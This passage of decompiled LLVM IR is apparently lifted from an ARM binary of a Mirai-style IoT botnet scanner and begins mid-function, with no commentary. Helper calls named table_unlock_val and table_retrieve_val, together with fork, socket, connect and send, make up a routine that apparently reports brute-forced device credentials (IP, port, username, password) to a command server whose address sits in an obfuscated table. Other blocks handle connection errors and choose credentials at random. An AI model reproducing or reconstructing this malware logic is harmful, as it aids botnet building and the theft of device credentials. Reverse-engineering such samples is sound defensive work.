  %v2_f7dc = inttoptr i32 %v1_f7dc to i16*
  %v3_f7dc = load i16, i16* %v2_f7dc, align 2
  %v4_f7dc = zext i16 %v3_f7dc to i32
  store i32 %v4_f7dc, i32* %r3.global-to-local, align 4
  %v1_f7e0 = add i32 %v0_f7dc, 16
  %v2_f7e0 = inttoptr i32 %v1_f7e0 to i32*
  %v3_f7e0 = load i32, i32* %v2_f7e0, align 4
  store i32 %v3_f7e0, i32* %r2.global-to-local, align 4
  store i32 %v2_f7e4, i32* %ip.global-to-local, align 4
  store i32 %v4_f7dc, i32* %stack_var_-42, align 4
  store i32 %v3_f7e0, i32* %stack_var_-60, align 4
  %v1_f7f0 = inttoptr i32 %v0_f7dc to i32*
  %v2_f7f0 = load i32, i32* %v1_f7f0, align 4
  store i32 %v2_f7f0, i32* @r8, align 4
  %v0_f7f4 = call i32 @__libc_fork()
  store i32 %v0_f7f4, i32* %r0.global-to-local, align 4
  %v7_f7f8 = icmp eq i32 %v0_f7f4, -1
  %.465 = zext i1 %v7_f7f8 to i32
  store i32 %.465, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f804 = icmp eq i32 %v0_f7f4, 0
  store i1 %v2_f804, i1* %cpsr_z.global-to-local, align 1
  %tmp458 = icmp slt i32 %v0_f7f4, 1
  br i1 %tmp458, label %bb459, label %.thread144

.thread144:                                       ; preds = %dec_label_pc_f7dc
  store i32 1, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f818

bb459:                                            ; preds = %dec_label_pc_f7dc
  store i32 %.465, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f810 = icmp eq i1 %v7_f7f8, false
  store i1 %v2_f810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f810, label %dec_label_pc_f9a0, label %dec_label_pc_f818

dec_label_pc_f818:                                ; preds = %.thread144, %bb459
  %v0_f818 = load i32, i32* @r6, align 4
  %v1_f818 = add i32 %v0_f818, 4
  %v2_f818 = inttoptr i32 %v1_f818 to i32*
  %v3_f818 = load i32, i32* %v2_f818, align 4
  store i32 %v3_f818, i32* %r0.global-to-local, align 4
  %v1_f81c = call i32 @__GI___libc_close(i32 %v3_f818)
  store i32 %v1_f81c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_f824 = load i32, i32* @r4, align 4
  %v1_f824 = load i32, i32* @r6, align 4
  %v2_f824 = add i32 %v1_f824, 4
  %v3_f824 = inttoptr i32 %v2_f824 to i32*
  store i32 %v0_f824, i32* %v3_f824, align 4
  %v0_f828 = load i32, i32* @r3, align 4
  %v1_f828 = load i32, i32* @r6, align 4
  %v2_f828 = add i32 %v1_f828, 12
  %v3_f828 = inttoptr i32 %v2_f828 to i32*
  store i32 %v0_f828, i32* %v3_f828, align 4
  br label %dec_label_pc_f58c

dec_label_pc_f830:                                ; preds = %dec_label_pc_f6fc
  store i32 %v2_f6bc, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_f83c = add i32 %v0_f6e8, 4
  %v2_f83c = inttoptr i32 %v1_f83c to i32*
  %v3_f83c = load i32, i32* %v2_f83c, align 4
  store i32 %v3_f83c, i32* %r0.global-to-local, align 4
  %v4_f840 = call i32 @__libc_send(i32 %v3_f83c, i32 %v2_f6bc, i32 3, i32 16384)
  store i32 %v4_f840, i32* %r0.global-to-local, align 4
  %v0_f844 = load i32, i32* @r6, align 4
  %v1_f844 = add i32 %v0_f844, 4
  %v2_f844 = inttoptr i32 %v1_f844 to i32*
  %v3_f844 = load i32, i32* %v2_f844, align 4
  store i32 %v3_f844, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f184

dec_label_pc_f854:                                ; preds = %dec_label_pc_ed80
  store i32 %.pre282, i32* @r0, align 4
  %v1_f85c = add i32 %v0_f854, 92
  store i32 %v1_f85c, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_f864 = call i32 @memmove(i32 %.pre282, i32 %v1_f85c, i32 192)
  store i32 %v3_f864, i32* %r0.global-to-local, align 4
  %v0_f868 = load i32, i32* @r6, align 4
  %v1_f868 = add i32 %v0_f868, 24
  %v2_f868 = inttoptr i32 %v1_f868 to i32*
  %v3_f868 = load i32, i32* %v2_f868, align 4
  %v1_f86c = add i32 %v3_f868, -64
  store i32 %v1_f86c, i32* %r3.global-to-local, align 4
  store i32 %v1_f86c, i32* %v2_f868, align 4
  br label %dec_label_pc_ed90

dec_label_pc_f878:                                ; preds = %dec_label_pc_eed0
  %v0_f878 = load i32, i32* @r6, align 4
  store i32 %v0_f878, i32* @r0, align 4
  %v0_f87c = call i32 @setup_connection()
  store i32 %v0_f87c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef0c

dec_label_pc_f884:                                ; preds = %dec_label_pc_ed38
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_e4a8, i32* %r3.global-to-local, align 4
  store i32 %v2_f628, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v5_f8ac = call i32 @getsockopt(i32 %v3_ed2c, i32 1, i32 4, i32 %v2_e4a8, i32 %v2_f628)
  %v3_f8b0 = load i8, i8* %stack_var_-56, align 1
  %v4_f8b0 = sext i8 %v3_f8b0 to i32
  store i32 %v4_f8b0, i32* %r3.global-to-local, align 4
  %v2_f8b4 = or i32 %v4_f8b0, %v5_f8ac
  store i32 %v2_f8b4, i32* %r0.global-to-local, align 4
  %v4_f8b4 = icmp eq i32 %v2_f8b4, 0
  store i1 %v4_f8b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f8b4, label %dec_label_pc_f8bc, label %dec_label_pc_f968

dec_label_pc_f8bc:                                ; preds = %dec_label_pc_f884
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_f8c0 = load i32, i32* @r6, align 4
  %v2_f8c0 = add i32 %v1_f8c0, 12
  %v3_f8c0 = inttoptr i32 %v2_f8c0 to i32*
  store i32 2, i32* %v3_f8c0, align 4
  %v0_f8c4 = call i32 @rand_next()
  %v2_f8cc = load i16, i16* bitcast (i16** @global_var_21908.143 to i16*), align 4
  %v3_f8cc = zext i16 %v2_f8cc to i32
  %v2_f8d0 = udiv i32 %v0_f8c4, %v3_f8cc
  %v3_f8d0 = urem i32 %v0_f8c4, %v3_f8cc
  store i32 %v2_f8d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_218d8.139 to i32), i32* %r3.global-to-local, align 4
  %v2_f8d8 = load i32, i32* @global_var_218d8.139, align 4
  store i32 %v2_f8d8, i32* %ip.global-to-local, align 4
  %v1_f8e0 = load i32, i32* @r4, align 4
  %v9_f8e0 = icmp eq i32 %v2_f8d8, %v1_f8e0
  store i1 %v9_f8e0, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_f8d0, i32* %r1.global-to-local, align 4
  %v7_f8e8 = icmp sgt i32 %v2_f8d8, %v1_f8e0
  br i1 %v7_f8e8, label %dec_label_pc_f8ec, label %dec_label_pc_f92c

dec_label_pc_f8ec:                                ; preds = %dec_label_pc_f8bc
  %v2_f8f0 = load i32, i32* @global_var_21904.141, align 4
  store i32 %v2_f8f0, i32* %r3.global-to-local, align 4
  store i32 %v1_f8e0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f90c

dec_label_pc_f8fc:                                ; preds = %dec_label_pc_f91c, %dec_label_pc_f90c
  %v1_f8fc = add i32 %v0_f8fc, 1
  store i32 %v1_f8fc, i32* %r2.global-to-local, align 4
  %v9_f900 = icmp eq i32 %v1_f8fc, %v2_f8d8
  %v1_f904 = add i32 %v0_f904, 16
  store i32 %v1_f904, i32* %r3.global-to-local, align 4
  br i1 %v9_f900, label %dec_label_pc_f92c.loopexit, label %dec_label_pc_f90c

dec_label_pc_f90c:                                ; preds = %dec_label_pc_f8fc, %dec_label_pc_f8ec
  %v0_f8fc = phi i32 [ %v1_f8fc, %dec_label_pc_f8fc ], [ %v1_f8e0, %dec_label_pc_f8ec ]
  %v0_f904 = phi i32 [ %v1_f904, %dec_label_pc_f8fc ], [ %v2_f8f0, %dec_label_pc_f8ec ]
  store i32 %v0_f904, i32* %r0.global-to-local, align 4
  %v1_f910 = add i32 %v0_f904, 8
  %v2_f910 = inttoptr i32 %v1_f910 to i16*
  %v3_f910 = load i16, i16* %v2_f910, align 2
  %v4_f910 = zext i16 %v3_f910 to i32
  store i32 %v4_f910, i32* %r3.global-to-local, align 4
  %tmp460 = icmp ugt i32 %v4_f910, %v3_f8d0
  br i1 %tmp460, label %dec_label_pc_f8fc, label %dec_label_pc_f91c

dec_label_pc_f91c:                                ; preds = %dec_label_pc_f90c
  %v1_f91c = add i32 %v0_f904, 10
  %v2_f91c = inttoptr i32 %v1_f91c to i16*
  %v3_f91c = load i16, i16* %v2_f91c, align 2
  %v4_f91c = zext i16 %v3_f91c to i32
  store i32 %v4_f91c, i32* %r3.global-to-local, align 4
  %v3_f920 = icmp uge i32 %v4_f91c, %v3_f8d0
  %v9_f920 = icmp eq i32 %v4_f91c, %v3_f8d0
  %v2_f924 = xor i1 %v3_f920, true
  %v3_f924 = or i1 %v9_f920, %v2_f924
  br i1 %v3_f924, label %dec_label_pc_f8fc, label %dec_label_pc_f930.loopexit

dec_label_pc_f92c.loopexit:                       ; preds = %dec_label_pc_f8fc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f92c

dec_label_pc_f92c:                                ; preds = %dec_label_pc_f92c.loopexit, %dec_label_pc_f8bc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f930

dec_label_pc_f930.loopexit:                       ; preds = %dec_label_pc_f91c
  store i1 %v3_f920, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f930

dec_label_pc_f930:                                ; preds = %dec_label_pc_f930.loopexit, %dec_label_pc_f92c
  %v0_f944 = phi i32 [ %v0_f904, %dec_label_pc_f930.loopexit ], [ 0, %dec_label_pc_f92c ]
  %v0_f930 = load i32, i32* @r6, align 4
  %v1_f930 = add i32 %v0_f930, 4
  %v2_f930 = inttoptr i32 %v1_f930 to i32*
  %v3_f930 = load i32, i32* %v2_f930, align 4
  %v3_f934 = udiv i32 %v3_f930, 32
  store i32 %v3_f934, i32* %r2.global-to-local, align 4
  %v1_f938 = urem i32 %v3_f930, 32
  store i32 %v1_f938, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_f93c = mul nuw nsw i32 %v3_f934, 4
  store i32 %v3_f93c, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_f944 = inttoptr i32 %v0_f930 to i32*
  store i32 %v0_f944, i32* %v2_f944, align 4
  %v0_f948 = load i32, i32* %r3.global-to-local, align 4
  %v1_f948 = load i32, i32* @r6, align 4
  %v2_f948 = add i32 %v1_f948, 24
  %v3_f948 = inttoptr i32 %v2_f948 to i32*
  store i32 %v0_f948, i32* %v3_f948, align 4
  %v0_ed60.pre = load i32, i32* @ip, align 4
  %v1_ed68.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ed5c

dec_label_pc_f950:                                ; preds = %dec_label_pc_f674
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f954 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f95c = call i32 @table_lock_val(i32 27)
  store i32 %v1_f95c, i32* %r0.global-to-local, align 4
  %v0_f960 = load i32, i32* @r6, align 4
  %v1_f960 = add i32 %v0_f960, 12
  %v2_f960 = inttoptr i32 %v1_f960 to i32*
  %v3_f960 = load i32, i32* %v2_f960, align 4
  store i32 %v3_f960, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed78.backedge

dec_label_pc_f968:                                ; preds = %dec_label_pc_f884
  %v0_f968 = load i32, i32* @r6, align 4
  %v1_f968 = add i32 %v0_f968, 4
  %v2_f968 = inttoptr i32 %v1_f968 to i32*
  %v3_f968 = load i32, i32* %v2_f968, align 4
  store i32 %v3_f968, i32* %r0.global-to-local, align 4
  %v1_f96c = call i32 @__GI___libc_close(i32 %v3_f968)
  store i32 %v1_f96c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_f974 = load i32, i32* @r4, align 4
  %v1_f974 = load i32, i32* @r6, align 4
  %v2_f974 = add i32 %v1_f974, 12
  %v3_f974 = inttoptr i32 %v2_f974 to i32*
  store i32 %v0_f974, i32* %v3_f974, align 4
  %v0_f978 = load i32, i32* %r3.global-to-local, align 4
  %v1_f978 = load i32, i32* @r6, align 4
  %v2_f978 = add i32 %v1_f978, 4
  %v3_f978 = inttoptr i32 %v2_f978 to i32*
  store i32 %v0_f978, i32* %v3_f978, align 4
  %v0_f97c = load i32, i32* @r4, align 4
  %v1_f97c = trunc i32 %v0_f97c to i8
  %v2_f97c = load i32, i32* @r6, align 4
  %v3_f97c = add i32 %v2_f97c, 284
  %v4_f97c = inttoptr i32 %v3_f97c to i8*
  store i8 %v1_f97c, i8* %v4_f97c, align 1
  br label %dec_label_pc_ee7c

dec_label_pc_f984:                                ; preds = %dec_label_pc_ee2c
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_f988 = load i32, i32* @fp, align 4
  %v2_f988 = inttoptr i32 %v1_f988 to i32*
  store i32 104, i32* %v2_f988, align 4
  br label %dec_label_pc_ee44

dec_label_pc_f990:                                ; preds = %thread-pre-split124
  store i32 %v1_f994, i32* %r0.global-to-local, align 4
  %v0_f998 = load i32, i32* @r6, align 4
  %v1_f998 = add i32 %v0_f998, 12
  %v2_f998 = inttoptr i32 %v1_f998 to i32*
  %v3_f998 = load i32, i32* %v2_f998, align 4
  store i32 %v3_f998, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ed78.backedge

dec_label_pc_ed78.backedge.thread:                ; preds = %dec_label_pc_ef38, %dec_label_pc_f00c, %dec_label_pc_f1b0, %dec_label_pc_f284, %dec_label_pc_f3d0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ed80

dec_label_pc_ed78.backedge.thread561:             ; preds = %dec_label_pc_f2e8, %dec_label_pc_f214, %dec_label_pc_f434, %dec_label_pc_f070, %dec_label_pc_ef9c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ed80

dec_label_pc_ed78.backedge:                       ; preds = %dec_label_pc_edf4, %dec_label_pc_f990, %dec_label_pc_f950
  %v0_ed80228 = phi i32 [ %v0_f960, %dec_label_pc_f950 ], [ %v0_f998, %dec_label_pc_f990 ], [ %v0_edf4, %dec_label_pc_edf4 ]
  %v0_ed78.be = phi i32 [ %v3_f960, %dec_label_pc_f950 ], [ %v3_f998, %dec_label_pc_f990 ], [ %v3_edf4, %dec_label_pc_edf4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed78 = icmp eq i32 %v0_ed78.be, 0
  store i1 %v2_ed78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed78, label %dec_label_pc_ee7c, label %dec_label_pc_ed80

dec_label_pc_f9a0:                                ; preds = %bb459
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f9ac = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_f9ac, i32* %r0.global-to-local, align 4
  %v2_f9b0 = icmp eq i32 %v3_f9ac, -1
  store i1 %v2_f9b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9b0 = icmp eq i32 %v3_f9ac, -1
  store i1 %v7_f9b0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f9ac, i32* @r4, align 4
  br i1 %v7_f9b0, label %dec_label_pc_fa34, label %dec_label_pc_f9bc

dec_label_pc_f9bc:                                ; preds = %dec_label_pc_f9a0
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f9c0 = call i32 @table_unlock_val(i32 2)
  store i32 %v2_f7e4, i32* @lr, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([14 x i8]* @global_var_18f4c.90 to i32), i32* @r0, align 4
  %v2_f9d4 = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_18f4c.90 to i32))
  %v0_f9d8 = load i32, i32* @r5, align 4
  store i32 %v0_f9d8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_f9e4 = inttoptr i32 %v0_f9d8 to i32*
  %v3_f9e4 = call i32 @table_retrieve_val(i32 2, i32* %v2_f9e4)
  store i32 %v2_f7e4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_f9f8 = call i32 @table_lock_val(i32 2)
  %v0_fa00 = load i32, i32* @r4, align 4
  store i32 %v0_fa00, i32* %r0.global-to-local, align 4
  store i32 %v2_e6b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fa0c = call i32 @__libc_connect(i32 %v0_fa00, i32 %v2_e6b4, i32 16)
  store i32 %v3_fa0c, i32* %r0.global-to-local, align 4
  %v3_fa10 = icmp eq i32 %v3_fa0c, -1
  store i1 %v3_fa10, i1* %cpsr_c.global-to-local, align 1
  %v8_fa10 = icmp eq i32 %v3_fa0c, -1
  store i1 %v8_fa10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fa10, label %dec_label_pc_fa18, label %dec_label_pc_fa3c

dec_label_pc_fa18:                                ; preds = %dec_label_pc_f9bc
  %v0_fa18 = load i32, i32* @r4, align 4
  store i32 %v0_fa18, i32* %r0.global-to-local, align 4
  %v1_fa1c = call i32 @__GI___libc_close(i32 %v0_fa18)
  %v0_fa20 = load i32, i32* @r5, align 4
  store i32 %v0_fa20, i32* %r0.global-to-local, align 4
  %v1_fa24 = call i32 @__GI_exit(i32 %v0_fa20)
  store i32 %v1_fa24, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa28

dec_label_pc_fa28:                                ; preds = %dec_label_pc_e484, %dec_label_pc_fa18
  store i32 ptrtoint (i32* @global_var_243f4.151 to i32), i32* %ip.global-to-local, align 4
  %v2_fa2c = load i32, i32* @global_var_243f4.151, align 4
  store i32 %v2_fa2c, i32* %r0.global-to-local, align 4
  %v1_fa30 = call i32 @__GI___libc_close(i32 %v2_fa2c)
  store i32 %v1_fa30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa34

dec_label_pc_fa34:                                ; preds = %dec_label_pc_e460.dec_label_pc_fa34_crit_edge, %dec_label_pc_f9a0, %dec_label_pc_fa3c, %dec_label_pc_fa28
  %.pre.pre-phi = phi i32 [ %.pre283, %dec_label_pc_e460.dec_label_pc_fa34_crit_edge ], [ %v2_e4a8, %dec_label_pc_f9a0 ], [ %v2_fa3c.pre-phi, %dec_label_pc_fa3c ], [ %v2_e4a8, %dec_label_pc_fa28 ]
  %v0_fa34 = load i32, i32* @r5, align 4
  store i32 %v0_fa34, i32* %r0.global-to-local, align 4
  %v1_fa38 = call i32 @__GI_exit(i32 %v0_fa34)
  store i32 %v1_fa38, i32* %r0.global-to-local, align 4
  %.pre281 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_fa3c

dec_label_pc_fa3c:                                ; preds = %dec_label_pc_f9bc, %dec_label_pc_fa34
  %v2_fa5c.pre-phi = phi i32 [ %v2_f628, %dec_label_pc_f9bc ], [ %.pre281, %dec_label_pc_fa34 ]
  %v2_fa3c.pre-phi = phi i32 [ %v2_e4a8, %dec_label_pc_f9bc ], [ %.pre.pre-phi, %dec_label_pc_fa34 ]
  store i32 %v2_fa3c.pre-phi, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fa48 = load i32, i32* @r4, align 4
  store i32 %v0_fa48, i32* %r0.global-to-local, align 4
  %v0_fa4c = load i32, i32* @r5, align 4
  %v6_fa4c = trunc i32 %v0_fa4c to i8
  store i8 %v6_fa4c, i8* %stack_var_-56, align 1
  %v6_fa50 = call i32 @__libc_send(i32 %v0_fa48, i32 %v2_fa3c.pre-phi, i32 1, i32 16384)
  %v0_fa58 = load i32, i32* @r4, align 4
  store i32 %v0_fa58, i32* %r0.global-to-local, align 4
  store i32 %v2_fa5c.pre-phi, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fa68 = call i32 @__libc_send(i32 %v0_fa58, i32 %v2_fa5c.pre-phi, i32 4, i32 16384)
  %v0_fa70 = load i32, i32* @r4, align 4
  store i32 %v0_fa70, i32* %r0.global-to-local, align 4
  %v2_fa74 = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_fa74, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fa80 = call i32 @__libc_send(i32 %v0_fa70, i32 %v2_fa74, i32 2, i32 16384)
  %v0_fa84 = load i32, i32* @r8, align 4
  %v1_fa84 = add i32 %v0_fa84, 12
  store i32 %v1_fa84, i32* %r1.global-to-local, align 4
  %v0_fa88 = load i32, i32* @r4, align 4
  store i32 %v0_fa88, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fa94 = call i32 @__libc_send(i32 %v0_fa88, i32 %v1_fa84, i32 1, i32 16384)
  store i32 %v4_fa94, i32* %r0.global-to-local, align 4
  %v0_fa98 = load i32, i32* @r8, align 4
  %v1_fa98 = inttoptr i32 %v0_fa98 to i32*
  %v2_fa98 = load i32, i32* %v1_fa98, align 4
  store i32 %v2_fa98, i32* %r1.global-to-local, align 4
  %v1_fa9c = add i32 %v0_fa98, 12
  %v2_fa9c = inttoptr i32 %v1_fa9c to i8*
  %v3_fa9c = load i8, i8* %v2_fa9c, align 1
  %v4_fa9c = zext i8 %v3_fa9c to i32
  store i32 %v4_fa9c, i32* %r2.global-to-local, align 4
  %v0_faa0 = load i32, i32* @r4, align 4
  store i32 %v0_faa0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_faa8 = call i32 @__libc_send(i32 %v0_faa0, i32 %v2_fa98, i32 %v4_fa9c, i32 16384)
  %v0_faac = load i32, i32* @r8, align 4
  %v1_faac = add i32 %v0_faac, 13
  store i32 %v1_faac, i32* %r1.global-to-local, align 4
  %v0_fab0 = load i32, i32* @r4, align 4
  store i32 %v0_fab0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fabc = call i32 @__libc_send(i32 %v0_fab0, i32 %v1_faac, i32 1, i32 16384)
  %v0_fac0 = load i32, i32* @r4, align 4
  store i32 %v0_fac0, i32* %r0.global-to-local, align 4
  %v0_fac4 = load i32, i32* @r8, align 4
  %v1_fac4 = add i32 %v0_fac4, 13
  %v2_fac4 = inttoptr i32 %v1_fac4 to i8*
  %v3_fac4 = load i8, i8* %v2_fac4, align 1
  %v4_fac4 = zext i8 %v3_fac4 to i32
  store i32 %v4_fac4, i32* %r2.global-to-local, align 4
  %v1_fac8 = add i32 %v0_fac4, 4
  %v2_fac8 = inttoptr i32 %v1_fac8 to i32*
  %v3_fac8 = load i32, i32* %v2_fac8, align 4
  store i32 %v3_fac8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fad0 = call i32 @__libc_send(i32 %v0_fac0, i32 %v3_fac8, i32 %v4_fac4, i32 16384)
  %v0_fad4 = load i32, i32* @r4, align 4
  store i32 %v0_fad4, i32* %r0.global-to-local, align 4
  %v1_fad8 = call i32 @__GI___libc_close(i32 %v0_fad4)
  store i32 %v1_fad8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa34

; uselistorder directives
  uselistorder i32 %v2_fa3c.pre-phi, { 2, 1, 0 }
  uselistorder i32 %v2_fa5c.pre-phi, { 1, 0 }
  uselistorder i1 %v7_f9b0, { 1, 0 }
  uselistorder i32 %v3_f9ac, { 1, 0, 2, 3 }
  uselistorder i32 %v3_f930, { 1, 0 }
  uselistorder i1 %v3_f920, { 1, 0 }
  uselistorder i32 %v0_f904, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_f8d0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_f8cc, { 1, 0 }
  uselistorder i32 %v0_f8c4, { 1, 0 }
  uselistorder i32 %v3_f844, { 1, 0 }
  uselistorder i1 %v2_f810, { 1, 0 }
  uselistorder i32 %.465, { 1, 0 }
  uselistorder i1 %v7_f7f8, { 1, 0 }
  uselistorder i32 %v0_f7f4, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f7cc, { 1, 0 }
  uselistorder i32 %v0_f7cc, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f71c.pr, { 1, 0 }
  uselistorder i32 %v0_f6e8, { 1, 2, 0 }
  uselistorder i32 %v4_f688, { 1, 0, 2 }
  uselistorder i1 %v7_f664, { 1, 0 }
  uselistorder i32 %v1_f60c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f60c, { 0, 2, 1 }
  uselistorder i32 %v0_f604, { 1, 0 }
  uselistorder i1 %v7_f600, { 1, 0 }
  uselistorder i1 %v7_f5f8, { 1, 0 }
  uselistorder i1 %v7_f5f0, { 1, 0 }
  uselistorder i1 %v8_f5e8, { 1, 0 }
  uselistorder i1 %v7_f5cc, { 1, 0 }
  uselistorder i1 %v7_f5c4, { 1, 0 }
  uselistorder i1 %v7_f5bc, { 1, 0 }
  uselistorder i1 %v8_f5b4, { 1, 0 }
  uselistorder i32 %v1_f59c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v0_f548, { 1, 0 }
  uselistorder i32 %v4_f53c, { 1, 0, 2 }
  uselistorder i32 %v1_f508, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f508, { 0, 2, 1 }
  uselistorder i32 %v0_f500, { 1, 0 }
  uselistorder i1 %v7_f4fc, { 1, 0 }
  uselistorder i1 %v7_f4f4, { 1, 0 }
  uselistorder i1 %v8_f4ec, { 1, 0 }
  uselistorder i1 %v7_f4d0, { 1, 0 }
  uselistorder i1 %v7_f4c8, { 1, 0 }
  uselistorder i1 %v8_f4c0, { 1, 0 }
  uselistorder i32 %v1_f4a8, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v8_f444, { 1, 0 }
  uselistorder i8 %v3_f43c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f434, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f434, { 0, 2, 1 }
  uselistorder i32 %v0_f42c, { 1, 0 }
  uselistorder i1 %v7_f428, { 1, 0 }
  uselistorder i1 %v7_f420, { 1, 0 }
  uselistorder i1 %v7_f418, { 1, 0 }
  uselistorder i1 %v7_f404, { 1, 0 }
  uselistorder i1 %v7_f3fc, { 1, 0 }
  uselistorder i1 %v7_f3f4, { 1, 0 }
  uselistorder i1 %v8_f3ec, { 1, 0 }
  uselistorder i32 %v1_f3d4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f2f8, { 1, 0 }
  uselistorder i8 %v3_f2f0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f2e8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f2e8, { 0, 2, 1 }
  uselistorder i32 %v0_f2e0, { 1, 0 }
  uselistorder i1 %v7_f2dc, { 1, 0 }
  uselistorder i1 %v7_f2d4, { 1, 0 }
  uselistorder i1 %v7_f2cc, { 1, 0 }
  uselistorder i1 %v7_f2b8, { 1, 0 }
  uselistorder i1 %v7_f2b0, { 1, 0 }
  uselistorder i1 %v7_f2a8, { 1, 0 }
  uselistorder i1 %v8_f2a0, { 1, 0 }
  uselistorder i32 %v1_f288, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_f224, { 1, 0 }
  uselistorder i8 %v3_f21c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_f214, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_f214, { 0, 2, 1 }
  uselistorder i32 %v0_f20c, { 1, 0 }
  uselistorder i1 %v7_f208, { 1, 0 }
  uselistorder i1 %v7_f200, { 1, 0 }
  uselistorder i1 %v7_f1f8, { 1, 0 }
  uselistorder i1 %v7_f1e4, { 1, 0 }
  uselistorder i1 %v7_f1dc, { 1, 0 }
  uselistorder i1 %v7_f1d4, { 1, 0 }
  uselistorder i1 %v8_f1cc, { 1, 0 }
  uselistorder i32 %v1_f1b4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
